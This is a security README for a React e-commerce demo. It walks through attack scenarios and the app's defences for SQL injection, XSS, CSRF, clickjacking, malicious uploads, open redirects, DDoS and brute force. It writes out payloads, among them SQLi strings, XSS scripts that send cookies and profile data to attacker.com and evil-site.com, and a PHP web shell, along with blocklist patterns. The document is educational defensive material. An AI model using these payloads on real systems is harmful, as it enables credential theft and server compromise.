# FixerUpper - E-commerce Platform

## Table of Contents

1. [Project Overview](#project-overview)
2. [Purpose](#purpose)
3. [Getting Started](#getting-started)
4. [Functionality](#functionality)
5. [Security](#security)
6. [Use Cases](#use-cases)
7. [Testing Security](#testing-security)

## Project Overview

FixerUpper is a modern, secure e-commerce platform built with React and Redux. It provides a comprehensive online shopping experience with robust security measures to protect both users and the platform from various cyber threats.

## Purpose

This project serves as a demonstration of modern web development practices with a strong emphasis on security. It showcases:

- Modern React development with hooks and functional components
- Redux state management for complex application state
- Comprehensive security implementations
- Best practices for input validation and sanitization
- Protection against common web vulnerabilities
- Performance optimization techniques

The platform is designed for educational and demonstration purposes, showing how to build secure web applications that can withstand various types of cyber attacks.

## Getting Started

### Prerequisites

- Node.js (version 16 or higher)
- npm or yarn package manager
- Git

### Installation and Setup

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd fixerUpper-front
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Start the development server**
   ```bash
   npm run dev
   ```

4. **Open your code editor**
   - Recommended: VS Code with React extensions
   - The project will be available at `http://localhost:5180`

5. **Build for production**
   ```bash
   npm run build
   ```

6. **Run tests**
   ```bash
   npm test
   ```

### Project Structure

```
src/
├── components/          # Reusable UI components
├── pages/              # Application pages
├── redux/              # State management
├── utils/              # Utility functions
│   ├── security/       # Security implementations
│   └── validation/     # Input validation
├── hooks/              # Custom React hooks
├── api/                # API service functions
└── css/                # Global styles
```

## Functionality

### Core Features

- **User Authentication**: Registration, login, logout with secure session management
- **Product Management**: Browse, search, and filter products
- **Shopping Cart**: Add/remove items, quantity management
- **Order Management**: Place orders, view order history, order details
- **Admin Panel**: Product management, order tracking, user management
- **Responsive Design**: Mobile-first approach with modern UI/UX

### Technical Features

- **State Management**: Redux Toolkit for centralized state management
- **Routing**: React Router for client-side navigation
- **Form Handling**: Formik with Joi validation
- **Animations**: Framer Motion for smooth user interactions
- **Performance**: Lazy loading, code splitting, optimization
- **Security**: Comprehensive protection against web vulnerabilities

## Security

This project implements multiple layers of security protection against various cyber threats. Each security measure is documented with its purpose, implementation, and testing procedures.

### SQL Injection Protection

**Threat Description**: SQL injection attacks occur when malicious SQL code is inserted into input fields, allowing attackers to manipulate databases and access sensitive information.

**Attack Scenario - Step by Step**:

**Scenario 1: Login Bypass Attack**
```
Step 1: Attacker identifies login form
- Attacker visits: https://fixerupper.com/login
- Finds username and password fields
- Analyzes form submission process

Step 2: Attacker crafts malicious payload
- Username: admin' OR '1'='1' --
- Password: anything
- The -- comments out the rest of the query

Step 3: Without protection - what happens:
Original query: SELECT * FROM users WHERE username='admin' AND password='password'
Modified query: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
Result: Query returns admin user record, attacker gains access

Step 4: With our protection - what happens:
- SQLProtectionWrapper detects malicious pattern
- Input sanitization removes dangerous characters
- Validation blocks the request
- User sees: "Invalid input detected"
- Attack is logged for monitoring

Step 5: Consequences comparison:
Without protection: Attacker gains admin access, can modify products, view user data, delete orders
With protection: Attack blocked, user account flagged for review, no damage done
```

**Scenario 2: Data Extraction Attack**
```
Step 1: Attacker finds search functionality
- Visits: https://fixerupper.com/products
- Uses search field to test for SQL injection

Step 2: Attacker tests with union-based payload
- Search: ' UNION SELECT username, password FROM users --
- Attempts to extract user credentials

Step 3: Without protection - what happens:
Original query: SELECT * FROM products WHERE name LIKE '%search%'
Modified query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT username, password FROM users --%'
Result: Database returns user credentials alongside products

Step 4: With our protection - what happens:
- Pattern detection identifies UNION keyword
- Input validation blocks the request
- Search returns empty results
- Security alert triggered

Step 5: Consequences comparison:
Without protection: All user passwords exposed, massive data breach, GDPR violations
With protection: Attack blocked, no data exposed, security team notified
```

**Potential Impact**: 
- Unauthorized access to user data (bypassing login)
- Database corruption or deletion (DROP TABLE commands)
- Privilege escalation (accessing admin accounts)
- Data breach and privacy violations (extracting sensitive information)

**How Protection Works in This Project**:

The project implements multi-layered SQL injection protection through the `SQLProtectionWrapper` component and validation utilities:

1. **Input Sanitization** (`src/utils/security/sqlProtection/sanitization.js`):
   - Removes dangerous SQL keywords: SELECT, UNION, DROP, INSERT, UPDATE, DELETE
   - Filters special characters: quotes, semicolons, comment markers
   - Example: `admin' OR '1'='1'` becomes `admin OR 1=1` (safer but still blocked)

2. **Pattern Detection** (`src/utils/security/sqlProtection/validation.js`):
   - Detects SQL injection patterns using regex
   - Blocks queries containing: `OR 1=1`, `UNION SELECT`, `--`, `;`
   - Returns validation errors for suspicious input

3. **Component Integration** (`src/components/SQLProtectionWrapper/`):
   - Wraps form inputs with automatic SQL injection detection
   - Real-time validation as users type
   - Prevents form submission with malicious input

4. **Hook Usage** (`src/hooks/useSQLProtection.js`):
   - Provides easy integration for components
   - Returns validation state and sanitized input
   - Logs attempted SQL injection attacks

**Testing Procedures**:
1. Attempt to inject SQL commands in login forms: `admin' OR '1'='1' --`
2. Test with malicious input in search fields: `'; DROP TABLE users; --`
3. Try to bypass validation with encoded characters: `admin%27%20OR%20%271%27%3D%271%27`
4. Test with various SQL injection payloads in different input fields

**Files**: `src/utils/security/sqlProtection/`, `src/components/SQLProtectionWrapper/`, `src/hooks/useSQLProtection.js`

### Cross-Site Scripting (XSS) Protection

**Threat Description**: XSS attacks inject malicious scripts into web pages, which execute in users' browsers and can steal sensitive information or perform unauthorized actions.

**Attack Scenario - Step by Step**:

**Scenario 1: Session Hijacking Attack**
```
Step 1: Attacker identifies user input field
- Attacker visits product review section
- Finds comment/description field where users can input text
- Analyzes how user input is displayed on the page

Step 2: Attacker crafts malicious XSS payload
- Input: <script>fetch('/api/user/profile', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('http://attacker.com/steal', {method:'POST', body:JSON.stringify(d)}))</script>
- This script steals user profile data and sends it to attacker's server

Step 3: Without protection - what happens:
- Malicious script is stored in database
- When admin views the review, script executes in admin's browser
- Script makes authenticated request to /api/user/profile
- User data is stolen and sent to attacker.com
- Attacker receives: {"name": "Admin User", "email": "admin@fixerupper.com", "role": "admin"}

Step 4: With our protection - what happens:
- SafeHTML component processes the input
- DOMPurify sanitizes the content, removing <script> tags
- Input becomes: (empty string - script removed)
- No malicious code executes
- Security alert logged: "XSS attempt blocked"

Step 5: Consequences comparison:
Without protection: Admin credentials stolen, attacker can impersonate admin, access all user data
With protection: Attack blocked, no data stolen, malicious input sanitized
```

**Scenario 2: Cookie Theft Attack**
```
Step 1: Attacker finds product description field
- Attacker creates a fake product listing
- Uses description field to inject malicious code

Step 2: Attacker crafts cookie theft payload
- Description: <script>document.location='http://evil-site.com/steal.php?cookie='+document.cookie</script>
- This redirects users to attacker's site with their cookies

Step 3: Without protection - what happens:
- Malicious script stored in product description
- When customers view the product, script executes
- Users redirected to evil-site.com with session cookies
- Attacker receives: "sessionId=abc123; authToken=xyz789; userRole=customer"
- Attacker can now impersonate users and make purchases

Step 4: With our protection - what happens:
- Input validation detects script tags
- DOMPurify removes all JavaScript code
- Description becomes: (clean text without scripts)
- CSP headers prevent inline script execution
- No redirect occurs, cookies remain secure

Step 5: Consequences comparison:
Without protection: Customer sessions hijacked, unauthorized purchases made, user accounts compromised
With protection: Attack blocked, user sessions secure, no unauthorized access
```

**Potential Impact**:
- Session hijacking (stealing authentication tokens)
- Cookie theft (accessing user accounts)
- Malicious redirects (phishing attacks)
- Keylogger installation (password theft)
- Phishing attacks (fake login forms)

**How Protection Works in This Project**:

The project implements comprehensive XSS protection through multiple layers:

1. **HTML Sanitization** (`src/utils/security/sanitizeHtml.js`):
   - Uses DOMPurify library to clean HTML content
   - Removes dangerous tags: `<script>`, `<iframe>`, `<object>`
   - Strips event handlers: `onclick`, `onload`, `onerror`
   - Example: `<script>alert('XSS')</script>` becomes empty string

2. **Safe HTML Component** (`src/components/SafeHTML/`):
   - Wraps user-generated content with sanitization
   - Automatically applies DOMPurify before rendering
   - Used in product descriptions, user comments, search results
   - Example usage: `<SafeHTML content={userInput} />`

3. **Input Validation** (`src/utils/validation/`):
   - Validates input before processing
   - Blocks HTML tags in text fields
   - Length limits to prevent large payloads
   - Pattern matching for suspicious content

4. **Content Security Policy** (`src/utils/security/rateLimiting/securityHeaders.js`):
   - Prevents inline script execution
   - Restricts external resource loading
   - Implements nonce-based script execution
   - Blocks eval() and similar dangerous functions

5. **Output Encoding**:
   - HTML entity encoding for special characters
   - URL encoding for user-provided URLs
   - JavaScript string escaping for dynamic content

**Testing Procedures**:
1. Inject script tags in input fields: `<script>alert('XSS')</script>`
2. Test with JavaScript event handlers: `<img src="x" onerror="alert('XSS')">`
3. Attempt to execute malicious code: `<svg onload="alert('XSS')">`
4. Test with various XSS payloads in different contexts (forms, URLs, search)

**Files**: `src/utils/security/sanitizeHtml.js`, `src/components/SafeHTML/`, `src/utils/security/rateLimiting/securityHeaders.js`

### Cross-Site Request Forgery (CSRF) Protection

**Threat Description**: CSRF attacks trick users into performing unwanted actions on web applications where they are authenticated.

**Attack Scenario - Step by Step**:

**Scenario 1: Money Transfer Attack**
```
Step 1: Attacker creates malicious website
- Attacker sets up evil-site.com
- Creates attractive page with "Free Gift" offer
- Embeds hidden form targeting FixerUpper's payment system

Step 2: Attacker crafts CSRF attack
- Hidden form: <form action="https://fixerupper.com/api/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker-bank-account">
  <input type="submit" value="Click for free gift!">
</form>

Step 3: Without protection - what happens:
- Logged-in user visits evil-site.com
- User clicks "Click for free gift!" button
- Form submits to FixerUpper with user's session cookies
- Server processes transfer: $1000 sent to attacker's account
- User's bank account debited without their knowledge

Step 4: With our protection - what happens:
- CSRF service validates request token
- Hidden form lacks valid CSRF token
- Server rejects request: "CSRF token missing"
- No transfer occurs, user's money remains safe
- Security alert logged: "CSRF attack blocked"

Step 5: Consequences comparison:
Without protection: User loses $1000, attacker profits, bank dispute required
With protection: Attack blocked, no money lost, user account secure
```

**Scenario 2: Account Takeover Attack**
```
Step 1: Attacker targets user's email change
- Attacker creates malicious page with hidden iframe
- Embeds FixerUpper's profile page invisibly

Step 2: Attacker crafts email change attack
- Hidden iframe: <iframe src="https://fixerupper.com/profile" style="opacity:0; width:1px; height:1px;"></iframe>
- JavaScript: <script>
  setTimeout(() => {
    fetch('https://fixerupper.com/api/change-email', {
      method: 'POST',
      credentials: 'include',
      body: JSON.stringify({email: 'attacker@evil.com'})
    });
  }, 1000);
</script>

Step 3: Without protection - what happens:
- User visits malicious page while logged into FixerUpper
- Hidden iframe loads user's profile page
- JavaScript executes after 1 second delay
- Email changed to attacker@evil.com
- Attacker can now reset password and take over account

Step 4: With our protection - what happens:
- CSRF token validation blocks the request
- SameSite cookie prevents cross-site request
- Origin header validation fails
- Request rejected: "Invalid origin"
- User's email remains unchanged

Step 5: Consequences comparison:
Without protection: Account hijacked, attacker controls user's account, can make purchases
With protection: Attack blocked, account remains secure, user maintains control
```

**Potential Impact**:
- Unauthorized transactions (money transfers, purchases)
- Account modifications (email changes, password resets)
- Data deletion (account deletion, data removal)
- Privilege changes (role modifications, access grants)

**How Protection Works in This Project**:

The project implements comprehensive CSRF protection through the CSRF service and security headers:

1. **CSRF Token Service** (`src/api/csrfService.js`):
   - Generates unique tokens for each session
   - Validates tokens on every state-changing request
   - Tokens are included in forms and AJAX requests
   - Example: Each form includes `<input type="hidden" name="_csrf" value="random-token">`

2. **SameSite Cookie Attributes**:
   - Cookies are set with `SameSite=Strict` or `SameSite=Lax`
   - Prevents cookies from being sent in cross-site requests
   - Blocks most CSRF attacks automatically
   - Example: `Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly`

3. **Origin Verification**:
   - Checks the `Origin` header on requests
   - Validates that requests come from the same origin
   - Blocks requests from unauthorized domains
   - Example: Only allows requests from `https://fixerupper.com`

4. **Double-Submit Cookies**:
   - CSRF token is stored both in form and cookie
   - Server verifies both values match
   - Prevents token theft through XSS
   - Example: Token in form must match token in cookie

5. **Referer Header Validation**:
   - Checks that requests come from legitimate pages
   - Blocks requests from external sites
   - Validates referrer chain
   - Example: Only allows requests from `https://fixerupper.com/*`

**Testing Procedures**:
1. Create malicious forms targeting authenticated users (test money transfer)
2. Test cross-origin requests (try to change user data from external site)
3. Attempt to bypass CSRF protection (modify tokens, headers)
4. Test with various CSRF attack vectors (forms, images, AJAX)

**Files**: `src/api/csrfService.js`, `src/utils/security/rateLimiting/securityHeaders.js`

### Clickjacking Protection

**Threat Description**: Clickjacking attacks trick users into clicking on hidden or disguised elements by overlaying malicious content.

**Attack Scenario - Step by Step**:

**Scenario 1: Money Transfer Clickjacking**
```
Step 1: Attacker creates malicious website
- Attacker sets up fake-bank.com
- Creates convincing bank interface
- Embeds FixerUpper's transfer page invisibly

Step 2: Attacker crafts clickjacking attack
- HTML: <iframe src="https://fixerupper.com/transfer" style="opacity:0.1; position:absolute; top:0; left:0; width:100%; height:100%; z-index:9999;"></iframe>
- Overlay: <button style="position:absolute; top:200px; left:300px; z-index:10000; background:green;">Confirm Transfer $50</button>
- User sees: Green "Confirm Transfer $50" button
- Reality: Invisible iframe with "Confirm Transfer $5000" button

Step 3: Without protection - what happens:
- User visits fake-bank.com
- User sees green button saying "$50 transfer"
- User clicks button thinking it's for $50
- Actually clicks invisible iframe button for $5000
- $5000 transferred from user's account to attacker

Step 4: With our protection - what happens:
- X-Frame-Options: DENY header prevents iframe embedding
- Browser blocks the iframe: "Refused to display in frame"
- User only sees the fake button, can't click hidden iframe
- No transfer occurs, user's money remains safe
- Security alert logged: "Clickjacking attempt blocked"

Step 5: Consequences comparison:
Without protection: User loses $5000, attacker profits, bank dispute required
With protection: Attack blocked, no money lost, user account secure
```

**Scenario 2: Account Deletion Attack**
```
Step 1: Attacker targets admin account deletion
- Attacker creates fake admin panel interface
- Embeds FixerUpper's user management page

Step 2: Attacker crafts account deletion attack
- HTML: <div style="position:relative;">
  <iframe src="https://fixerupper.com/admin/users" style="position:absolute; top:0; opacity:0; width:100%; height:100%;"></iframe>
  <div style="position:absolute; top:100px; left:200px; background:url('cute-kitten.jpg'); width:300px; height:200px;">
    <p>Click to see cute kittens!</p>
  </div>
</div>

Step 3: Without protection - what happens:
- Admin visits malicious site while logged into FixerUpper
- Admin sees kitten image and clicks to see more
- Actually clicks invisible iframe's "Delete User" button
- Important user account deleted from system
- Customer data lost, business impact severe

Step 4: With our protection - what happens:
- Frame busting JavaScript detects iframe embedding
- Script executes: if (window.top !== window.self) window.top.location = window.self.location;
- Page redirects to top-level window
- No hidden iframe interaction possible
- Admin's actions remain safe

Step 5: Consequences comparison:
Without protection: User account deleted, data lost, customer complaints, legal issues
With protection: Attack blocked, user data preserved, admin actions secure
```

**Potential Impact**:
- Unauthorized clicks (money transfers, purchases)
- Data theft (sharing private information)
- Account takeover (changing passwords, emails)
- Malicious downloads (installing malware)

**How Protection Works in This Project**:

The project implements comprehensive clickjacking protection through multiple layers:

1. **X-Frame-Options Headers** (`src/utils/security/rateLimiting/securityHeaders.js`):
   - Sets `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN`
   - Prevents pages from being embedded in iframes
   - Blocks most clickjacking attacks
   - Example: `X-Frame-Options: DENY` blocks all iframe embedding

2. **Content Security Policy** (`src/utils/security/webSecurity/clickjackingProtection/`):
   - Uses `frame-ancestors` directive
   - Restricts which domains can embed the page
   - Example: `frame-ancestors 'self'` only allows same-origin embedding

3. **JavaScript Frame Busting**:
   - Detects if page is loaded in iframe
   - Redirects to top-level window if embedded
   - Prevents overlay attacks
   - Example: `if (window.top !== window.self) window.top.location = window.self.location;`

4. **Trusted Domain Whitelisting**:
   - Only allows embedding from trusted domains
   - Validates parent window origin
   - Blocks suspicious embedding attempts
   - Example: Only allows embedding from `https://fixerupper.com`

5. **Suspicious Pattern Detection**:
   - Monitors for unusual click patterns
   - Detects rapid successive clicks
   - Alerts on suspicious user behavior
   - Example: Blocks if user clicks same area rapidly

**Testing Procedures**:
1. Attempt to embed pages in iframes from external sites
2. Test frame busting mechanisms (try to overlay content)
3. Try to overlay malicious content (test CSS positioning attacks)
4. Test with various clickjacking techniques (drag-drop, double-click)

**Files**: `src/utils/security/webSecurity/clickjackingProtection/`, `src/utils/security/rateLimiting/securityHeaders.js`

### Upload Attack Protection

**Threat Description**: Upload attacks involve uploading malicious files that can execute code, contain malware, or exploit server vulnerabilities.

**Attack Scenario - Step by Step**:

**Scenario 1: Web Shell Upload Attack**
```
Step 1: Attacker identifies file upload functionality
- Attacker visits FixerUpper's product management section
- Finds file upload for product images
- Analyzes upload restrictions and validation

Step 2: Attacker crafts web shell payload
- Filename: innocent-image.php
- Content: <?php system($_GET['cmd']); ?>
- Disguises as image file but contains PHP backdoor

Step 3: Without protection - what happens:
- File uploaded successfully to server
- Web shell accessible at: https://fixerupper.com/uploads/innocent-image.php
- Attacker visits: https://fixerupper.com/uploads/innocent-image.php?cmd=whoami
- Server executes: whoami command, returns: "www-data"
- Attacker gains full server control, can execute any command

Step 4: With our protection - what happens:
- File type validation detects .php extension
- Upload rejected: "File type not allowed"
- MIME type verification fails
- Content scanning detects PHP code
- File quarantined for manual review
- Security alert logged: "Malicious file upload blocked"

Step 5: Consequences comparison:
Without protection: Server compromised, attacker has full control, can steal data, install malware
With protection: Attack blocked, server secure, no unauthorized access possible
```

**Scenario 2: Malware Distribution Attack**
```
Step 1: Attacker creates malicious executable
- Attacker develops malware disguised as legitimate software
- Names file: "FixerUpper_Product_Manager.exe"
- Contains keylogger and data theft capabilities

Step 2: Attacker attempts to upload malware
- Tries to upload through product documentation feature
- File size: 5MB (under typical limit)
- MIME type spoofed as "application/pdf"

Step 3: Without protection - what happens:
- File uploaded successfully
- Available at: https://fixerupper.com/downloads/FixerUpper_Product_Manager.exe
- Customers download thinking it's legitimate software
- Malware installs on customer computers
- Keylogger steals passwords, banking information
- Attacker collects sensitive customer data

Step 4: With our protection - what happens:
- Magic number checking detects file is not PDF
- File header validation fails
- Content scanning identifies executable code
- Upload blocked: "File content doesn't match declared type"
- Malware never reaches customers
- Security team notified of attack attempt

Step 5: Consequences comparison:
Without protection: Customer computers infected, data stolen, legal liability, reputation damage
With protection: Attack blocked, customers protected, no malware distribution
```

**Potential Impact**:
- Server compromise (web shells, remote code execution)
- Malware distribution (infecting users' computers)
- Code execution (running malicious scripts on server)
- Storage exhaustion (denial of service)
- Data corruption (overwriting important files)

**How Protection Works in This Project**:

The project implements comprehensive upload protection through the SecureFileUpload component and validation utilities:

1. **File Type Validation** (`src/components/SecureFileUpload/`):
   - Whitelist of allowed file extensions
   - Blocks executable files: .exe, .bat, .sh, .php, .jsp
   - Only allows safe file types: .jpg, .png, .pdf, .docx
   - Example: Only allows image files for product photos

2. **MIME Type Verification** (`src/utils/security/webSecurity/uploadProtection/`):
   - Validates file MIME type matches extension
   - Prevents MIME type spoofing
   - Checks file headers for authenticity
   - Example: .jpg file must have image/jpeg MIME type

3. **File Size Limits**:
   - Maximum file size: 10MB for images, 50MB for documents
   - Prevents storage exhaustion attacks
   - Configurable limits per file type
   - Example: Product images limited to 5MB

4. **Magic Number Checking**:
   - Validates file headers (magic bytes)
   - Ensures file content matches declared type
   - Prevents file type spoofing
   - Example: JPEG files must start with FF D8 FF

5. **Content Scanning**:
   - Scans file content for malicious patterns
   - Detects embedded scripts in images
   - Checks for suspicious code patterns
   - Example: Blocks images containing `<script>` tags

6. **Upload Rate Limiting**:
   - Limits uploads per user per hour
   - Prevents bulk upload attacks
   - Implements progressive delays
   - Example: Maximum 10 uploads per hour per user

7. **Quarantine System**:
   - Suspicious files are quarantined for review
   - Automated scanning before approval
   - Manual review for flagged files
   - Example: Files with suspicious content are held for admin review

**Testing Procedures**:
1. Attempt to upload executable files (test with .exe, .bat, .php)
2. Test with files containing malicious code (JavaScript in images)
3. Try to bypass file type restrictions (double extensions, null bytes)
4. Test with oversized files (files larger than 100MB)

**Files**: `src/components/SecureFileUpload/`, `src/utils/security/webSecurity/uploadProtection/`

### Open Redirect Protection

**Threat Description**: Open redirect vulnerabilities allow attackers to redirect users to malicious websites while appearing to come from the legitimate site.

**Attack Scenario - Step by Step**:

**Scenario 1: Phishing Redirect Attack**
```
Step 1: Attacker creates fake FixerUpper login page
- Attacker sets up fixerupper-login.evil-site.com
- Creates convincing copy of FixerUpper's login page
- Includes form that steals credentials

Step 2: Attacker crafts redirect URL
- URL: https://fixerupper.com/login?redirect=https://fixerupper-login.evil-site.com
- Disguises malicious site as legitimate FixerUpper subdomain

Step 3: Without protection - what happens:
- User clicks link or visits URL
- FixerUpper login page loads normally
- After login, user redirected to evil-site.com
- User sees fake FixerUpper page, enters credentials
- Credentials stolen: username/password sent to attacker
- Attacker gains access to user's FixerUpper account

Step 4: With our protection - what happens:
- URL validation checks redirect parameter
- Domain not in whitelist: "fixerupper-login.evil-site.com"
- Redirect blocked: "Invalid redirect URL"
- User remains on FixerUpper, no redirection occurs
- Security alert logged: "Open redirect attempt blocked"

Step 5: Consequences comparison:
Without protection: User credentials stolen, account compromised, unauthorized purchases
With protection: Attack blocked, user credentials secure, no account compromise
```

**Scenario 2: JavaScript Code Injection Attack**
```
Step 1: Attacker targets redirect parameter
- Attacker finds redirect functionality in FixerUpper
- Identifies that redirect parameter is processed without validation

Step 2: Attacker crafts JavaScript injection
- URL: https://fixerupper.com/login?redirect=javascript:alert('XSS')
- Attempts to execute JavaScript code in user's browser

Step 3: Without protection - what happens:
- User visits malicious URL
- FixerUpper processes redirect parameter
- JavaScript code executes: alert('XSS') shows popup
- Attacker can modify to steal cookies: javascript:document.location='http://attacker.com/steal?cookie='+document.cookie
- User's session cookies stolen and sent to attacker

Step 4: With our protection - what happens:
- Suspicious pattern detection identifies "javascript:" protocol
- Protocol validation blocks JavaScript execution
- Redirect blocked: "Invalid protocol detected"
- No JavaScript execution occurs
- User remains on FixerUpper safely

Step 5: Consequences comparison:
Without protection: JavaScript executes, cookies stolen, session hijacked
With protection: Attack blocked, no code execution, session secure
```

**Potential Impact**:
- Phishing attacks (fake login pages stealing credentials)
- Malware distribution (redirecting to malicious downloads)
- Credential theft (fake authentication forms)
- Brand reputation damage (users lose trust in the site)

**How Protection Works in This Project**:

The project implements comprehensive redirect protection through validation and whitelisting:

1. **URL Validation and Whitelisting** (`src/utils/security/webSecurity/redirectProtection/`):
   - Maintains whitelist of allowed domains
   - Only allows redirects to trusted domains
   - Validates URL format and structure
   - Example: Only allows redirects to `https://fixerupper.com/*`

2. **Domain Verification**:
   - Checks redirect URLs against whitelist
   - Validates domain ownership
   - Prevents subdomain attacks
   - Example: Blocks `fixerupper.evil-site.com` even if it contains "fixerupper"

3. **Suspicious Pattern Detection**:
   - Detects common attack patterns
   - Blocks JavaScript protocols
   - Prevents data URL abuse
   - Example: Blocks URLs starting with `javascript:` or `data:`

4. **Encoding Attack Prevention**:
   - Handles URL encoding properly
   - Prevents double/triple encoding bypasses
   - Validates decoded URLs
   - Example: Decodes `%253A` to `%3A` to `:` and validates final URL

5. **Redirect History Tracking**:
   - Logs all redirect attempts
   - Monitors for suspicious patterns
   - Tracks failed redirect attempts
   - Example: Logs when users try to redirect to blocked domains

**Testing Procedures**:
1. Attempt to redirect to external malicious sites (test with evil-site.com)
2. Test with encoded URLs (try double encoding)
3. Try to bypass domain restrictions (test with subdomains)
4. Test with various redirect techniques (JavaScript, data URLs)

**Files**: `src/utils/security/webSecurity/redirectProtection/`

### Rate Limiting and DDoS Protection

**Threat Description**: DDoS attacks overwhelm servers with excessive requests, causing service disruption and potential system crashes.

**Attack Scenario - Step by Step**:

**Scenario 1: Application Layer DDoS Attack**
```
Step 1: Attacker identifies expensive endpoints
- Attacker analyzes FixerUpper's API endpoints
- Discovers /api/products/search performs complex database queries
- Identifies this as resource-intensive operation

Step 2: Attacker launches coordinated attack
- Deploys botnet with 10,000 compromised computers
- Each bot sends 10 requests per second to /api/products/search
- Total: 100,000 requests per second with complex search queries
- Queries designed to be expensive: searching for rare terms, complex filters

Step 3: Without protection - what happens:
- Server receives 100,000 requests per second
- Each search query takes 2-5 seconds to process
- Database becomes overloaded, CPU usage hits 100%
- Server becomes unresponsive, legitimate users can't access site
- Business loses revenue, customers frustrated

Step 4: With our protection - what happens:
- Rate limiter detects excessive requests per IP
- After 100 requests per minute, IP gets 1-second delay
- After 200 requests, delay increases to 5 seconds
- After 500 requests, IP gets blocked for 1 hour
- Legitimate users unaffected, server remains responsive

Step 5: Consequences comparison:
Without protection: Site completely down, business loses $50,000+ revenue, customer complaints
With protection: Attack mitigated, site remains functional, business continues normally
```

**Scenario 2: Slowloris Connection Exhaustion Attack**
```
Step 1: Attacker targets connection limits
- Attacker identifies FixerUpper's server connection limits
- Discovers server can handle 1000 concurrent connections
- Plans to exhaust all available connections

Step 2: Attacker launches slowloris attack
- Opens 1000 connections to FixerUpper
- Sends partial HTTP requests: "GET /api/products HTTP/1.1\r\nHost: fixerupper.com\r\n"
- Keeps connections open by sending headers slowly
- Never completes requests, keeps connections alive

Step 3: Without protection - what happens:
- All 1000 server connections occupied by attacker
- Legitimate users get "Connection refused" errors
- Server appears completely down to real users
- Attack can continue indefinitely
- Business completely inaccessible

Step 4: With our protection - what happens:
- Connection timeout limits detect slow connections
- Requests taking >30 seconds are automatically closed
- Rate limiting identifies suspicious connection patterns
- IP addresses with many slow connections get blocked
- Legitimate users can still connect normally

Step 5: Consequences comparison:
Without protection: Site completely inaccessible, business shutdown, emergency response required
With protection: Attack blocked, site remains accessible, normal operations continue
```

**Potential Impact**:
- Service unavailability (website becomes unreachable)
- Performance degradation (slow response times)
- Resource exhaustion (server runs out of memory/CPU)
- Business disruption (loss of revenue, customer trust)

**How Protection Works in This Project**:

The project implements comprehensive rate limiting through the rate limiter service:

1. **Request Rate Limiting** (`src/utils/security/rateLimiting/rateLimiter.js`):
   - Limits requests per IP address per time window
   - Configurable limits for different endpoints
   - Example: Maximum 100 requests per minute per IP

2. **IP-based Throttling**:
   - Tracks request frequency per IP address
   - Implements progressive delays for repeat offenders
   - Example: First violation = 1 second delay, second = 5 seconds, third = block

3. **Sliding Window Algorithms**:
   - Uses time-based windows for rate calculation
   - Prevents burst attacks by smoothing request patterns
   - Example: 100 requests per 60-second sliding window

4. **Progressive Delays**:
   - Increases delay time for repeated violations
   - Gradual escalation instead of immediate blocking
   - Example: 1s → 5s → 15s → 60s → block

5. **Automatic Blocking**:
   - Temporarily blocks IPs that exceed limits
   - Configurable block duration
   - Example: Block for 1 hour after 5 violations

6. **Endpoint-specific Limits**:
   - Different limits for different API endpoints
   - Login endpoints have stricter limits
   - Example: /api/login limited to 5 requests per minute

**Testing Procedures**:
1. Send excessive requests to endpoints (test with 1000+ requests per minute)
2. Test rate limiting mechanisms (verify delays and blocks)
3. Attempt to bypass restrictions (try different IPs, user agents)
4. Test with various DDoS techniques (slow requests, large payloads)

**Files**: `src/utils/security/rateLimiting/rateLimiter.js`

### Brute Force Protection

**Threat Description**: Brute force attacks attempt to gain unauthorized access by systematically trying different username/password combinations.

**Attack Scenario - Step by Step**:

**Scenario 1: Admin Account Takeover Attack**
```
Step 1: Attacker identifies target account
- Attacker discovers FixerUpper has admin accounts
- Finds admin login page: https://fixerupper.com/admin/login
- Researches common admin usernames: admin, administrator, root

Step 2: Attacker launches dictionary attack
- Username: admin
- Password attempts: password, admin, 123456, qwerty, letmein, welcome, password123
- Uses automated tool to try 1000+ common passwords per hour

Step 3: Without protection - what happens:
- Attacker tries password "admin" → Failed
- Tries "password" → Failed  
- Tries "123456" → SUCCESS!
- Attacker gains admin access to FixerUpper
- Can now: view all user data, modify products, delete orders, access payment info

Step 4: With our protection - what happens:
- First failed attempt: No delay
- Second failed attempt: 1-second delay
- Third failed attempt: 5-second delay
- Fourth failed attempt: 15-second delay
- Fifth failed attempt: Account locked for 1 hour
- CAPTCHA required after third attempt

Step 5: Consequences comparison:
Without protection: Admin account compromised, full system access, data breach, business shutdown
With protection: Attack blocked, admin account secure, system remains protected
```

**Scenario 2: Credential Stuffing Attack**
```
Step 1: Attacker acquires breached credentials
- Attacker purchases database from previous data breach
- Contains 10 million username/password combinations
- Includes FixerUpper users from other site breaches

Step 2: Attacker launches credential stuffing attack
- Uses automated tool to test 10,000 credentials per hour
- Tests combinations like: user@fixerupper.com / oldpassword123
- Distributes attack across 100 different IP addresses

Step 3: Without protection - what happens:
- Attacker tests 10,000 credentials per hour
- Finds 50 users with matching credentials
- Gains access to 50 FixerUpper accounts
- Can make unauthorized purchases, access personal data
- Sells account access on dark web

Step 4: With our protection - what happens:
- Rate limiting blocks excessive login attempts per IP
- Progressive delays slow down attack significantly
- Account lockout after 5 failed attempts
- Suspicious activity detection alerts security team
- Attack becomes economically unfeasible

Step 5: Consequences comparison:
Without protection: 50+ accounts compromised, financial losses, data theft, reputation damage
With protection: Attack mitigated, accounts remain secure, minimal impact
```

**Potential Impact**:
- Account compromise (gaining access to user accounts)
- Unauthorized access (accessing sensitive data)
- Data breach (stealing user information)
- System takeover (gaining admin privileges)

**How Protection Works in This Project**:

The project implements comprehensive brute force protection through the brute force protection service:

1. **Login Attempt Limiting** (`src/utils/security/rateLimiting/bruteForceProtection.js`):
   - Limits failed login attempts per account
   - Tracks attempts per IP address
   - Example: Maximum 5 failed attempts per account per hour

2. **Progressive Delays**:
   - Increases delay time after each failed attempt
   - Prevents rapid automated attacks
   - Example: 1s → 5s → 15s → 60s → block

3. **Account Lockout Mechanisms**:
   - Temporarily locks accounts after too many failed attempts
   - Requires admin intervention or time-based unlock
   - Example: Lock account for 1 hour after 5 failed attempts

4. **Suspicious Activity Detection**:
   - Monitors for unusual login patterns
   - Detects multiple failed attempts from same IP
   - Alerts administrators to suspicious activity
